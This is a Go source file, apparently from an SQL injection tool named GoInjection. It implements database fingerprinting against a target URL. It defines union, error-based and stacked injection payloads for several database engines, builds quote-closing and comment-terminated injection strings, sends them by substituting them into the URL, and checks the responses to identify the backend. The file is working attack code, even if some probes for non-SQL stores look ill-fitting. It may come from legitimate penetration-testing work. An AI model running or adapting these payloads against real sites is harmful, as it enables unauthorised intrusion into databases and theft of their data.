package modules

import (
	"GoInjection/backend/helper"
	"GoInjection/backend/query"
	"GoInjection/backend/structs"
	"fmt"
	"log"
	"strings"
)

type Fingerprint struct {
	Payload      string
	Validator    func(response string) bool
	DatabaseFunc string
}

// ToDo: Fingerprint DB rewrite (adapt it to the SQLi Query Generator)

var fingerprints = map[string]map[string]Fingerprint{
	"union": {
		"PostgresSQL":          {DatabaseFunc: "version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "postgres") }},
		"MySQL":                {DatabaseFunc: "version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mysql") }},
		"SQLite":               {DatabaseFunc: "sqlite_version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "sqlite") }},
		"Microsoft SQL Server": {DatabaseFunc: "SERVERPROPERTY('productversion')", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mssql") }},
		"Redis":                {DatabaseFunc: "version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "redis") }},
		"MariaDB":              {DatabaseFunc: "version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mariadb") }},
		"ElasticSearch":        {DatabaseFunc: "version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "elasticsearch") }},
		"Oracle":               {DatabaseFunc: "version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "oracle") }},
		"DynamoDB":             {DatabaseFunc: "version()", Payload: "UNION SELECT ", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "dynamodb") }},
	},
	"error": {
		"PostgresSQL":          {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "postgres") }},
		"MySQL":                {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mysql") }},
		"SQLite":               {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "sqlite") }},
		"Microsoft SQL Server": {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mssql") }},
		"Redis":                {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "redis") }},
		"MariaDB":              {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mariadb") }},
		"ElasticSearch":        {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "elasticsearch") }},
		"Oracle":               {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "oracle") }},
		"DynamoDB":             {Payload: "OR 1=1", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "dynamodb") }},
	},
	"stacked": {
		"PostgresSQL":          {DatabaseFunc: "current_database()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "postgres") }},
		"MySQL":                {DatabaseFunc: "database()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mysql") }},
		"SQLite":               {DatabaseFunc: "sqlite_version()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "sqlite") }},
		"Microsoft SQL Server": {DatabaseFunc: "SERVERPROPERTY('productversion')", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mssql") }},
		"Redis":                {DatabaseFunc: "version()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "redis") }},
		"MariaDB":              {DatabaseFunc: "version()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "mariadb") }},
		"ElasticSearch":        {DatabaseFunc: "version()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "elasticsearch") }},
		"Oracle":               {DatabaseFunc: "version()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "oracle") }},
		"DynamoDB":             {DatabaseFunc: "version()", Payload: "SELECT", Validator: func(resp string) bool { return strings.Contains(strings.ToLower(resp), "dynamodb") }},
	},
}

func StackedQueryBuilder(fingerprint Fingerprint) []string {
	var Closers = []string{")", "'", "\""}
	var Terminators = []string{";", "--", "/*", "*/"}

	if structs.TargetColumns <= 0 {
		return nil
	}

	tempQuery := strings.TrimSuffix(strings.Repeat(fingerprint.DatabaseFunc+",", structs.TargetColumns), ",")
	var payloads []string
	for _, closer := range Closers {
		for _, terminator := range Terminators {
			payloads = append(payloads, fmt.Sprintf("%s%s %s %s%s", closer, terminator, fingerprint.Payload, tempQuery, closer))
		}
	}

	return payloads
}

func UnionQueryBuilder(fingerprint Fingerprint) []string {
	if structs.TargetColumns <= 0 {
		return nil
	}

	tempQuery := strings.TrimSuffix(strings.Repeat(fingerprint.DatabaseFunc+",", structs.TargetColumns), ",")

	q := query.Query{DBMS: structs.TargetSyntax}
	generatedPayloads, _ := q.Build(fingerprint.Payload + " " + tempQuery)

	return generatedPayloads
}

func ErrorQueryBuilder(fingerprint Fingerprint) []string {
	q := query.Query{}
	generatedPayloads, _ := q.Build(fingerprint.Payload)

	return generatedPayloads
}

func FingerprintDB(url, method string) string {
	if _, ok := fingerprints[method]; !ok {
		helper.LogLine("Invalid fingerprint method: " + method)
		return "Invalid fingerprint method"
	}

	helper.LogLine("URL: " + url)
	helper.LogLine("Method: " + method)

	var detectedDB string
	checkFingerprints(url, method, &detectedDB)
	return detectedDB
}

func checkFingerprints(cleanedURL, method string, detectedDB *string) {
	if detectedDB == nil {
		log.Println("detectedDB pointer is nil")
		return
	}

	helper.LogLine("URL: " + cleanedURL)
	helper.LogLine("Method: " + method)
	for dbType, fp := range fingerprints[method] {
		if fp.Payload == "" {
			log.Printf("Skipping %s due to empty payload", dbType)
			continue
		}

		if !strings.Contains(cleanedURL, helper.PayloadReplaceString) {
			log.Printf("URL does not contain expected placeholder: %s", cleanedURL)
			continue
		}

		var generatedPayloads []string
		switch method {
		case "union":
			generatedPayloads = UnionQueryBuilder(fp)
		case "error":
			generatedPayloads = ErrorQueryBuilder(fp)
		case "stacked":
			generatedPayloads = StackedQueryBuilder(fp)
		}

		for _, generatedPayload := range generatedPayloads {
			encodedPayload := helper.URLEncode(fp.Payload)
			if encodedPayload == "" {
				log.Printf("Failed to encode payload for DB type: %s", dbType)
				continue
			}

			requestURL := strings.ReplaceAll(cleanedURL, helper.PayloadReplaceString, helper.URLEncode(generatedPayload))
			response, _ := helper.SendRequest(requestURL)
			structs.FingerprintLinks++

			if fp.Validator(response) {
				if *detectedDB == "" {
					*detectedDB = dbType
				}
				return
			}
		}
	}
}
